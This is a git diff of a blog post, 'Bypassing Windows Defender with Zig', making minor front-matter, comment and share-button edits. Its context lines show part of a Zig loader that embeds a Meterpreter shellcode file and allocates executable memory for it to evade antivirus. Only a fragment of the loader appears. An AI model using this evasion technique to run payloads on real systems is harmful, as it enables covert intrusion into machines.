@@ -1,7 +1,8 @@
 ---
 layout: post
-title: "Bypassing Windows Defender with Zig"
-author: "Michal"
+title: Bypassing Windows Defender with Zig
+author: Michal
+date: 2024-7-20 01:11 -0300
 ---
 
 
@@ -24,7 +25,7 @@ const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
 const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;
 
 pub fn main() !void {
-    // We include the compile as a string at compile time
+    // We include the shellcode as a string at compile time
     const shellcode = @embedFile("meterpreter.bin");
     // Allocate RWX memory for the shellcode
     const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
@@ -147,6 +148,7 @@ This basically encompasses my overall feelings of Zig - I like the language, and
 
 The last thing that I loved about the whole experience was the ease of cross compilation from Linux to Windows. You don't need to involve mingw, the output platform is just a compiler flag for Zig compiler. All code for this blog can be found in my [GitHub](https://github.com/michal-sladecek/zig_experiments). Changes might be necessary to run it.
 
+ {% include social-media-share.html %}
 
 
 
